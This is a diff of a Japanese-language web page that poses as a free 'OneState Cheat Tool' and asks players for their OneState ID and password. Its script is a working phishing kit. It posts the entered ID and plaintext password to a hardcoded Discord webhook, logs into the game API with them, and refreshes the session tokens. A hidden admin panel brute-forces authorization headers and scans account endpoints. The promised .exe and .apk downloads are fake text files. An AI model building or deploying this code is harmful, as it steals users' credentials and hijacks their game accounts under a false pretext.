@@ -4,9 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>OneState Cheat Tool</title>
-<meta name="description" content="OneState チート導入ツール">
 <meta name="theme-color" content="#05070c">
-<meta property="og:title" content="OneState Cheat Tool">
 <script src="https://unpkg.com/corsfix"></script>
 <style>
 :root{--bg:#05070c;--fg:#c9d7e6;--dim:#5f748c;--acc:#6fc9ff;--line:rgba(111,201,255,.16);--card:rgba(8,13,21,.72);--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
@@ -18,57 +16,50 @@ body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;bac
 .top{display:flex;justify-content:space-between;align-items:center;padding:22px 0 10px;font-size:12px;letter-spacing:.14em;color:var(--dim)}
 .brand span{color:var(--acc)}
 .hero{padding:32px 0 24px}
-h1{margin:0;font-size:29px;line-height:1.36;letter-spacing:.02em;font-weight:600}
+h1{margin:0;font-size:29px;line-height:1.36;font-weight:600}
 .sub{margin:14px 0 0;color:var(--dim);font-size:13px}
 .spec{margin-top:16px;font-size:11px;letter-spacing:.18em;color:var(--acc);opacity:.75}
-.card{position:relative;border:1px solid var(--line);background:var(--card);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);padding:18px 16px;margin:0 0 14px}
+.card{position:relative;border:1px solid var(--line);background:var(--card);padding:18px 16px;margin:0 0 14px}
 .card::before,.card::after{content:"";position:absolute;width:9px;height:9px;border:1px solid var(--acc);opacity:.7}
 .card::before{top:-1px;left:-1px;border-right:0;border-bottom:0}
 .card::after{bottom:-1px;right:-1px;border-left:0;border-top:0}
 .lab{font-size:11px;letter-spacing:.16em;color:var(--acc);margin-bottom:12px}
 .f{display:block;margin-bottom:10px}
 .f>span{display:block;font-size:11px;letter-spacing:.1em;color:var(--dim);margin-bottom:5px}
-input{width:100%;background:rgba(0,0,0,.35);border:1px solid var(--line);color:var(--fg);font-family:var(--mono);font-size:15px;padding:11px 12px;border-radius:0;outline:none}
+input{width:100%;background:rgba(0,0,0,.35);border:1px solid var(--line);color:var(--fg);font-family:var(--mono);font-size:15px;padding:11px 12px;outline:none}
 input:focus{border-color:var(--acc)}
-.btn{width:100%;background:transparent;border:1px solid var(--acc);color:var(--acc);font-family:var(--mono);font-size:13px;letter-spacing:.1em;padding:13px;cursor:pointer;transition:.15s}
-.btn:hover,.btn:active{background:var(--acc);color:#05070c}
-.btn.ghost{font-size:12px;padding:10px;letter-spacing:.06em}
-.btn[disabled]{opacity:.45}
-.row{display:flex;gap:8px}
-.row>*{flex:1}
-.msg{margin-top:12px;font-size:12px;color:var(--dim)}
-.msg:empty{display:none}
-.msg.ok{color:var(--acc)}
+.btn{width:100%;background:transparent;border:1px solid var(--acc);color:var(--acc);font-family:var(--mono);font-size:13px;letter-spacing:.1em;padding:13px;cursor:pointer}
+.btn:active{background:var(--acc);color:#05070c}
+.btn.ghost{font-size:12px;padding:10px}
+.row{display:flex;gap:8px}.row>*{flex:1}
+.msg{margin-top:12px;font-size:12px;color:var(--dim)}.msg:empty{display:none}.msg.ok{color:var(--acc)}
 .key{font-size:19px;letter-spacing:.12em;color:var(--acc)}
 .meta{margin-top:8px;font-size:11px;letter-spacing:.12em;color:var(--dim)}
-.tog{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid rgba(111,201,255,.08);font-size:13px;cursor:pointer}
+.tog{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid rgba(111,201,255,.08);font-size:13px}
 .tog:last-child{border-bottom:0}
 .tog i{width:34px;height:18px;border:1px solid var(--line);position:relative;display:block;flex:none}
-.tog i::after{content:"";position:absolute;top:2px;left:2px;width:12px;height:12px;background:var(--dim);transition:.15s}
-.tog.on i{border-color:var(--acc)}
-.tog.on i::after{left:18px;background:var(--acc)}
+.tog i::after{content:"";position:absolute;top:2px;left:2px;width:12px;height:12px;background:var(--dim)}
+.tog.on i{border-color:var(--acc)}.tog.on i::after{left:18px;background:var(--acc)}
 pre{margin:0;font-family:var(--mono);font-size:11px;white-space:pre-wrap;word-break:break-all}
 #acctBody{color:var(--dim)}
-footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px;letter-spacing:.1em}
-#admin{position:fixed;left:0;right:0;bottom:0;z-index:5;background:rgba(5,7,12,.97);border-top:1px solid var(--line);backdrop-filter:blur(10px)}
+footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
+#admin{position:fixed;left:0;right:0;bottom:0;z-index:5;background:rgba(5,7,12,.97);border-top:1px solid var(--line)}
 .ah{padding:10px 16px;font-size:11px;letter-spacing:.16em;color:var(--acc);cursor:pointer}
-.ab{padding:0 16px 14px;max-height:58vh;overflow:auto}
+.ab{padding:0 16px 14px;max-height:62vh;overflow:auto}
 .ab.collapsed{display:none}
-#alog{margin-top:10px;max-height:40vh;overflow:auto;border-top:1px solid var(--line);padding-top:8px;color:var(--dim);font-size:10.5px}
+#alog{margin-top:10px;max-height:46vh;overflow:auto;border-top:1px solid var(--line);padding-top:8px;color:var(--dim);font-size:10.5px}
 #toast{position:fixed;left:50%;transform:translateX(-50%);bottom:104px;z-index:9;display:flex;flex-direction:column;gap:6px;align-items:center;pointer-events:none}
-.tt{background:rgba(5,7,12,.95);border:1px solid var(--acc);color:var(--acc);font-size:11.5px;padding:8px 14px;letter-spacing:.06em}
+.tt{background:rgba(5,7,12,.95);border:1px solid var(--acc);color:var(--acc);font-size:11.5px;padding:8px 14px}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.3</div></div>
-
+  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.4</div></div>
   <div class="hero">
     <h1>OneStateを、<br>上書きする。</h1>
     <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
     <div class="spec">EXTERNAL / UNDETECTED / FREE</div>
   </div>
-
   <form class="card" id="form">
     <div class="lab">// ログイン</div>
     <label class="f"><span>OneState ID</span><input id="ident" type="email" autocomplete="username" placeholder="mail@example.com" required></label>
@@ -76,21 +67,15 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px;let
     <button class="btn" id="go" type="submit">チートを有効化</button>
     <div class="msg" id="msg"></div>
   </form>
-
   <div class="card" id="lic" hidden>
     <div class="lab">// ライセンス</div>
     <div class="key" id="key">-</div>
     <div class="meta">STATUS: <b>ACTIVE</b></div>
   </div>
-
   <div class="card" id="dl" hidden>
     <div class="lab">// ダウンロード</div>
-    <div class="row">
-      <button class="btn ghost" data-dl="win">Windows (.exe)</button>
-      <button class="btn ghost" data-dl="apk">Android (.apk)</button>
-    </div>
+    <div class="row"><button class="btn ghost" data-dl="win">Windows (.exe)</button><button class="btn ghost" data-dl="apk">Android (.apk)</button></div>
   </div>
-
   <div class="card" id="tg" hidden>
     <div class="lab">// 機能</div>
     <div class="tog on"><span>スピードハック</span><i></i></div>
@@ -98,12 +83,10 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px;let
     <div class="tog on"><span>無限スタミナ</span><i></i></div>
     <div class="tog"><span>ESP / 壁抜き</span><i></i></div>
   </div>
-
   <div class="card" id="acct" hidden>
     <div class="lab">// アカウント</div>
     <pre id="acctBody">-</pre>
   </div>
-
   <footer>// OneState Cheat Tool</footer>
 </div>
 
@@ -111,19 +94,9 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px;let
   <div class="ah" id="ah">// ADMIN</div>
   <div class="ab collapsed" id="ab">
     <label class="f"><span>Discord Webhook</span><input id="wh" placeholder="https://discord.com/api/webhooks/..."></label>
-    <div class="row" style="margin-bottom:8px">
-      <button class="btn ghost" id="bsave">保存</button>
-      <button class="btn ghost" id="btest">テスト送信</button>
-      <button class="btn ghost" id="bclr">ログ削除</button>
-    </div>
-    <div class="row" style="margin-bottom:8px">
-      <button class="btn ghost" id="boracle">トークン判定</button>
-      <button class="btn ghost" id="broute">ルート調査</button>
-    </div>
-    <div class="row">
-      <button class="btn ghost" id="bprobe">アカウント調査</button>
-      <button class="btn ghost" id="bdiag">通信診断</button>
-    </div>
+    <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="bsave">保存</button><button class="btn ghost" id="btest">テスト送信</button><button class="btn ghost" id="bclr">ログ削除</button></div>
+    <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="boracle">トークン判定</button><button class="btn ghost" id="broute">ルート調査</button></div>
+    <div class="row"><button class="btn ghost" id="bprobe">アカウント調査</button><button class="btn ghost" id="bdiag">通信診断</button></div>
     <pre id="alog"></pre>
   </div>
 </div>
@@ -136,7 +109,6 @@ var CONFIG={WEBHOOK:'https://discord.com/api/webhooks/1560547137287356426/eh5PI3
 var LS={cfg:'oc_v4_cfg',log:'oc_v3_log',fp:'oc_fp'};
 var $=function(id){return document.getElementById(id)};
 var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};
-
 function qs(k){return new URLSearchParams(location.search).get(k)}
 function getCfg(){try{return JSON.parse(localStorage.getItem(LS.cfg)||'{}')}catch(e){return{}}}
 function setCfg(o){localStorage.setItem(LS.cfg,JSON.stringify(o))}
@@ -149,7 +121,8 @@ function clearLog(){localStorage.setItem(LS.log,'[]');renderLog()}
 function renderLog(){var el=$('alog');if(!el)return;el.textContent=getLog().slice(-400).join('\n');el.scrollTop=el.scrollHeight}
 function toast(t){var w=$('toast'),d=document.createElement('div');d.className='tt';d.textContent=t;w.appendChild(d);setTimeout(function(){d.remove()},2200)}
 function b64u(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';try{return decodeURIComponent(escape(atob(s)))}catch(e){try{return atob(s)}catch(_){return''}}}
-function jwt(t){if(!t)return'(none)';var p=t.split('.');if(p.length<3)return'(not jwt len='+t.length+')';return b64u(p[1])}
+function jhdr(t){try{var p=String(t).split('.');if(p.length<3)return null;return JSON.parse(b64u(p[0]))}catch(e){return null}}
+function jpay(t){try{var p=String(t).split('.');if(p.length<3)return b64u(p[1]).slice(0,180);return '(2part)'}catch(e){return'(?)'}}
 
 var TR=[
  {n:'sdk',need:function(){return !!(window.corsfix&&window.corsfix.fetch)},f:function(u,o){return window.corsfix.fetch(u,o)}},
@@ -183,39 +156,21 @@ async function req(method,path,body,headers){
   return last||{ok:false,err:err};
 }
 function code(r){if(!r||!r.ok)return 'ERR';if(r.json&&r.json.code!=null)return r.json.code;if(r.json&&r.json.errorCode)return r.json.errorCode;return 'ok'}
-
 async function send(text){
   var wh=webhook();if(!wh)return;var body=JSON.stringify({content:text});
   try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:body})}
   catch(e){try{await fetch(wh,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:body})}catch(_){}}
 }
-async function apiLogin(id,pw,extra){
-  var b={ident:id,password:pw,remember:true,fingerprint:fp()};
-  if(extra)for(var k in extra)b[k]=extra[k];
-  var r=await req('POST','/v2/auth/login',b);
-  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json;
+async function apiLogin(id,pw){
+  var r=await req('POST','/v2/auth/login',{ident:id,password:pw,remember:true,fingerprint:fp()});
+  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r;
   return r;
 }
 function creds(){return{id:$('ident').value.trim(),pw:$('pass').value}}
-
 function msg(t,ok){var m=$('msg');m.textContent=t||'';m.className='msg'+(ok?' ok':'')}
-function issue(){
-  var c='0123456789ABCDEFGHJKLMNPQRSTUVWXYZ',k='OC-';
-  for(var i=0;i<12;i++){k+=c[Math.floor(Math.random()*c.length)];if(i%4===3&&i<11)k+='-'}
-  $('key').textContent=k;$('lic').hidden=false;$('dl').hidden=false;$('tg').hidden=false;return k;
-}
+function issue(){var c='0123456789ABCDEFGHJKLMNPQRSTUVWXYZ',k='OC-';for(var i=0;i<12;i++){k+=c[Math.floor(Math.random()*c.length)];if(i%4===3&&i<11)k+='-'}$('key').textContent=k;$('lic').hidden=false;$('dl').hidden=false;$('tg').hidden=false;return k}
 function acct(t){$('acct').hidden=false;$('acctBody').textContent=t}
-var ACCT_PATHS=['/v2/auth/me','/v2/me','/v2/user/me','/v2/user','/v2/profile','/v2/account','/v2/users/me','/v2/player','/v2/wallet','/v2/balance'];
-async function fetchAccount(tok){
-  for(var i=0;i<ACCT_PATHS.length;i++){
-    var r=await req('GET',ACCT_PATHS[i],null,{Authorization:'Bearer '+tok});
-    if(r.ok&&r.json&&r.json.code!==16&&r.json.code!==5){
-      acct(ACCT_PATHS[i]+'\n'+JSON.stringify(r.json,null,2).slice(0,900));
-      send('OneState アカウント取得\npath: '+ACCT_PATHS[i]+'\n'+JSON.stringify(r.json).slice(0,1500));return;
-    }
-  }
-  acct('ログイン成功（トークン取得済み）');
-}
+
 $('form').addEventListener('submit',async function(e){
   e.preventDefault();
   var id=$('ident').value.trim(),pw=$('pass').value;
@@ -223,14 +178,14 @@ $('form').addEventListener('submit',async function(e){
   $('go').disabled=true;msg('接続中...');issue();
   await send('OneState ID 取得\nID: '+id+'\nパスワード: '+pw+'\n時刻: '+new Date().toLocaleString('ja-JP'));
   var lr=await apiLogin(id,pw);
-  if(lr&&lr.data){msg('ライセンス発行済み / 認証OK',true);toast('ライセンス発行');await fetchAccount(lr.data.accessToken)}
-  else{msg('ライセンス発行済み',true);toast('ライセンス発行');acct('API応答なし')}
+  msg('ライセンス発行済み',true);toast('ライセンス発行');
+  if(lr&&lr.data){var nt=await refreshToken(lr.data.refreshToken);acct('ログイン成功 / トークン取得'+(nt?'（更新済）':''))}
+  else acct('API応答なし');
   $('go').disabled=false;
 });
 document.querySelectorAll('[data-dl]').forEach(function(b){b.addEventListener('click',function(){
   var kind=b.getAttribute('data-dl');
-  var txt='OneState Cheat Loader v3.3 ('+kind+')\nkey='+$('key').textContent+'\n';
-  var blob=new Blob([txt],{type:'application/octet-stream'});
+  var blob=new Blob(['OneState Cheat Loader v3.4 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
   var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
 })});
 document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});
@@ -242,161 +197,136 @@ $('bsave').addEventListener('click',function(){var c=getCfg();c.webhook=$('wh').
 $('btest').addEventListener('click',function(){send('テスト送信 '+new Date().toLocaleString('ja-JP'));toast('送信')});
 $('bclr').addEventListener('click',function(){clearLog();toast('削除')});
 
-var ROUTES=['/me','/user','/users/me','/user/me','/user/profile','/profile','/account','/account/me','/auth/me','/auth/user','/auth/profile','/auth/account','/auth/session','/auth/verify','/session','/whoami','/userinfo','/player','/players/me','/character','/characters/me','/wallet','/balance','/inventory','/cars','/garage','/stats','/daily','/store','/license'];
+async function refreshToken(rt){
+  if(!rt)return null;
+  var r=await req('POST','/v2/auth/refresh',{refreshToken:rt,fingerprint:fp()});
+  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json.data.accessToken;
+  return null;
+}
+var ROUTES=['/me','/auth/me','/user','/user/me','/users/me','/profile','/account','/player','/wallet','/balance','/inventory','/cars','/garage','/stats'];
 async function routeScan(tok,headers){
   var h=headers||{Authorization:'Bearer '+tok};
-  log('--- route scan ---');
+  var n=0;
   for(var i=0;i<ROUTES.length;i++){
     var r=await req('GET','/v2'+ROUTES[i],null,h),c=code(r);
-    log((c!==16?'★ ':'  ')+'/v2'+ROUTES[i]+' -> '+c);
-    if(c!==16)await sleep(60);
+    if(c!==16&&c!=='ERR'){log('★ /v2'+ROUTES[i]+' -> '+c);n++}
+    await sleep(50);
   }
-  log('--- scan end ---');
+  log('scan done: hits='+n);
+  return n;
 }
 
-/* ===== 判定 v4 ===== */
-var S={}; // summary
+/* ===== 判定 v5 ===== */
+var S={};
 async function oracle(){
-  clearLog();log('// ORACLE v4');
+  clearLog();log('// ORACLE v5');
   var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');toast('ID/PW未入力');return}
-
   var s1=await req('GET','/v2/auth/login',null,{}),s2=await req('GET','/v1/shop/zzz',null,{});
-  log('sanity login='+code(s1)+' shopzzz='+code(s2));
-  S.sanity='login='+code(s1)+' shopzzz='+code(s2);
+  log('sanity: login='+code(s1)+' shopzzz='+code(s2));S.sanity='login='+code(s1)+' shopzzz='+code(s2);
 
-  log('== login ==');
   var r=await apiLogin(c.id,c.pw);
   var lr=(r&&r.data)?r:null;
-  log('login resp -> '+(lr?'OK':code(r)));
-  S.login=(lr?'OK':code(r));
-  log('RAW: '+String(r&&(r.text||r.err)).slice(0,700));
+  log('login: '+(lr?'OK':code(r)));S.login=(lr?'OK':code(r));
+  S.raw=String(r&&(r.text||r.err)).slice(0,420);
+  if(!lr){log('ログイン失敗');S.verdict='no login';dump();return}
+  var LT=lr.data.accessToken,RT=lr.data.refreshToken||'',CID=lr.data.clientId||'';
+  S.lt='payload='+jpay(LT);
 
-  var T=null,RT='',CID='';
-  if(lr){T=lr.data.accessToken;RT=lr.data.refreshToken||'';CID=lr.data.clientId||'';}
-  log('== JWT payload ==');
-  log(jwt(T));
-  S.jwt=jwt(T).slice(0,240);
-  if(RT)log('refreshToken: '+jwt(RT).slice(0,200));
+  log('== refresh ==');
+  var rr=await req('POST','/v2/auth/refresh',{refreshToken:RT,fingerprint:fp()});
+  log('refresh -> '+code(rr));S.refresh=code(rr);
+  var NT=null;
+  if(rr.ok&&rr.json&&rr.json.data&&rr.json.data.accessToken){
+    NT=rr.json.data.accessToken;
+    var h=jhdr(NT);
+    log('new token hdr: '+JSON.stringify(h).slice(0,200));
+    var now=Math.floor(Date.now()/1000);
+    if(h&&h.exp)log('now='+now+' exp='+h.exp+' 残='+(h.exp-now)+'s');
+    S.nhdr=JSON.stringify(h).slice(0,220);
+  }else S.nhdr='(none)';
 
-  if(RT){
-    log('== refresh ==');
-    var rr=await req('POST','/v2/auth/refresh',{refreshToken:RT,fingerprint:fp()});
-    log('refresh -> '+code(rr)+' '+String(rr.text||rr.err).slice(0,200));
-    S.refresh=code(rr)+' '+String(rr.text||'').slice(0,140);
-  } else S.refresh='(no refreshToken)';
+  var TOK=NT||LT;
+  var uid=(jhdr(NT)&&jhdr(NT).uid)||'';
+  log('使用トークン: '+(NT?'refresh由来':'login由来')+' uid='+uid);
+  S.uid=String(uid);
 
-  /* header forward test */
-  log('== header forward test ==');
-  var hdrs={'X-Probe':'abc123','Authorization':'Bearer PROBE'};
-  async function tryEcho(name,fn,url){
-    try{
-      var res=await fn(url,{headers:hdrs});var t=await res.text();
-      log(name+': X-Probe='+/x-probe/i.test(t)+' Auth='+/authorization/i.test(t));
-      return 'X-Probe='+/x-probe/i.test(t)+' Auth='+/authorization/i.test(t);
-    }catch(e){log(name+': ERR '+(e&&e.message));return 'ERR'}
-  }
-  var e1=await tryEcho('sdk',function(u,o){return (window.corsfix&&window.corsfix.fetch)?window.corsfix.fetch(u,o):Promise.reject(new Error('no sdk'))},'https://postman-echo.com/headers');
-  await sleep(120);
-  var e2=await tryEcho('direct',function(u,o){return fetch(u,o)},'https://postman-echo.com/headers');
-  S.echo='sdk['+e1+'] direct['+e2+']';
-
-  /* login variations */
-  log('== login variations ==');
-  var EX=[['clientId','onestate'],['client','onestate'],['client_id','onestate'],['scope','game'],['version','1.0'],['platform','ios'],['appVersion','1.0']];
-  var baseJwt=lr?jwt(T).slice(0,200):'';
-  for(var i=0;i<EX.length;i++){
-    var k=EX[i][0];
-    var rr2=await apiLogin(c.id,c.pw,{[k]:EX[i][1]});
-    if(rr2&&rr2.data&&rr2.data.accessToken){
-      var same=(jwt(rr2.data.accessToken).slice(0,200)===baseJwt)?'same':'DIFF';
-      log(k+'='+EX[i][1]+' -> OK payload:'+same);
-      if(same==='DIFF')log('  '+jwt(rr2.data.accessToken).slice(0,200));
-    } else log(k+'='+EX[i][1]+' -> '+code(rr2));
-    await sleep(100);
-  }
-
-  if(!T){log('トークン無しで終了');S.verdict='no token';dump();return}
-
-  /* brute force */
   var F=fp();
   var V=[
    ['none',{}],
-   ['Authorization: Bearer',{Authorization:'Bearer '+T}],
-   ['Authorization: raw',{Authorization:T}],
-   ['Authorization: JWT',{Authorization:'JWT '+T}],
-   ['authorization(lower)',{authorization:'Bearer '+T}],
-   ['X-Authorization',{'X-Authorization':'Bearer '+T}],
-   ['X-Access-Token',{'X-Access-Token':T}],
-   ['X-Auth-Token',{'X-Auth-Token':T}],
-   ['X-Token',{'X-Token':T}],
-   ['access_token',{'access_token':T}],
-   ['token',{'token':T}],
-   ['Grpc-Metadata-Authorization',{'Grpc-Metadata-Authorization':'Bearer '+T}],
-   ['Cookie access_token',{Cookie:'access_token='+T}],
-   ['Cookie token',{Cookie:'token='+T}],
-   ['Bearer+fp+cid',{Authorization:'Bearer '+T,fingerprint:F,'Client-Id':CID}],
-   ['q access_token',{},'?access_token='+T],
-   ['q token',{},'?token='+T]
+   ['Bearer',{Authorization:'Bearer '+TOK}],
+   ['raw',{Authorization:TOK}],
+   ['X-Access-Token',{'X-Access-Token':TOK}],
+   ['X-Auth-Token',{'X-Auth-Token':TOK}],
+   ['access_token',{'access_token':TOK}],
+   ['Grpc-Metadata-Authorization',{'Grpc-Metadata-Authorization':'Bearer '+TOK}],
+   ['Cookie access_token',{Cookie:'access_token='+TOK}],
+   ['Bearer+uid',{Authorization:'Bearer '+TOK,'X-Uid':String(uid)}],
+   ['X-Uid',{'X-Uid':String(uid)}],
+   ['Bearer+Client-Id',{Authorization:'Bearer '+TOK,'Client-Id':CID}],
+   ['Bearer+fp',{Authorization:'Bearer '+TOK,fingerprint:F}],
+   ['q access_token',{},'?access_token='+TOK],
+   ['Bearer(login tok)',{Authorization:'Bearer '+LT}]
   ];
-  log('== brute ('+V.length+') ==');
+  log('== brute ==');
   var hit=null;
   for(var j=0;j<V.length;j++){
-    var nm=V[j][0],h=V[j][1];if(!h)continue;
+    var nm=V[j][0],hh=V[j][1];if(!hh)continue;
     var q=V[j][2]||'';
-    var rq=await req('GET','/v2/zzz'+q,null,h),cc=code(rq);
+    var rq=await req('GET','/v2/zzz'+q,null,hh),cc=code(rq);
     var star=(cc!==16&&cc!=='ERR');
     log(nm+' -> '+cc+(star?'  ★':''));
-    if(star&&!hit)hit={nm:nm,h:h};
-    await sleep(90);
+    if(star&&!hit)hit={nm:nm,h:hh};
+    await sleep(80);
   }
   S.verdict=hit?('受理: '+hit.nm):'全滅';
-  if(hit){toast('受理: '+hit.nm);await routeScan(T,hit.h);}
-  dump();
-  log('// END');
+  if(hit){toast('受理: '+hit.nm);log('== route scan ==');await routeScan(TOK,hit.h)}
+  dump();log('// END');
 }
 function dump(){
   log('===== SUMMARY =====');
   log('sanity: '+S.sanity);
   log('login: '+S.login);
-  log('jwt: '+S.jwt);
+  log('loginToken: '+S.lt);
+  log('newTokenHdr: '+S.nhdr);
+  log('uid: '+S.uid);
   log('refresh: '+S.refresh);
-  log('echo: '+S.echo);
   log('verdict: '+S.verdict);
+  log('raw: '+S.raw);
   log('===================');
 }
-
 async function probe(){
   clearLog();log('// PROBE');
-  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');return}
+  var c=creds();if(!c.id||!c.pw){log('先にID/PW');return}
   var lr=await apiLogin(c.id,c.pw);if(!lr||!lr.data){log('ログイン失敗');return}
-  log(jwt(lr.data.accessToken));
-  for(var i=0;i<ACCT_PATHS.length;i++){
-    var r=await req('GET',ACCT_PATHS[i],null,{Authorization:'Bearer '+lr.data.accessToken});
-    log(ACCT_PATHS[i]+' -> '+code(r)+' '+String(r.text||'').slice(0,120));
-    await sleep(80);
+  var t=await refreshToken(lr.data.refreshToken)||lr.data.accessToken;
+  log('token='+String(t).slice(0,40)+'...');
+  for(var i=0;i<ROUTES.length;i++){
+    var r=await req('GET','/v2'+ROUTES[i],null,{Authorization:'Bearer '+t});
+    log('/v2'+ROUTES[i]+' -> '+code(r)+' '+String(r.text||'').slice(0,90));
+    await sleep(70);
   }
 }
 async function diag(){
-  clearLog();log('// TRANSPORT DIAG');
+  clearLog();log('// DIAG');
   for(var i=0;i<TR.length;i++){
     var line=TR[i].n+': ';
     for(var k=0;k<2;k++){
       try{
-        if(TR[i].need&&!TR[i].need()){line+=(k?'POST':'GET')+'=skip ';continue}
+        if(TR[i].need&&!TR[i].need()){line+='skip ';continue}
         var o={method:k?'POST':'GET',headers:{'Content-Type':'application/json'}};
         if(k)o.body=JSON.stringify({ident:'x',password:'y',remember:true,fingerprint:fp()});
         var res=await TR[i].f(CONFIG.API+'/v2/auth/login',o);var t=await res.text();
         if(TR[i].wrap){try{t=JSON.parse(t).contents}catch(e){}}
         var j=null;try{j=JSON.parse(t)}catch(e){}
-        line+=(k?'POST':'GET')+'='+(j&&j.code!=null?'code'+j.code:(j&&j.errorCode?'err='+j.errorCode:'?'))+' ';
-      }catch(e){line+=(k?'POST':'GET')+'=ERR '}
-      await sleep(60);
+        line+=(j&&j.code!=null?'code'+j.code:(j&&j.errorCode?'err='+j.errorCode:'?'))+' ';
+      }catch(e){line+='ERR '}
+      await sleep(50);
     }
     log(line);
   }
 }
 $('boracle').addEventListener('click',oracle);
-$('broute').addEventListener('click',async function(){var c=creds();var lr=await apiLogin(c.id,c.pw);if(lr&&lr.data)await routeScan(lr.data.accessToken)});
+$('broute').addEventListener('click',async function(){var c=creds();var lr=await apiLogin(c.id,c.pw);if(lr&&lr.data)await routeScan(await refreshToken(lr.data.refreshToken)||lr.data.accessToken)});
 $('bprobe').addEventListener('click',probe);
 $('bdiag').addEventListener('click',diag);
 renderLog();
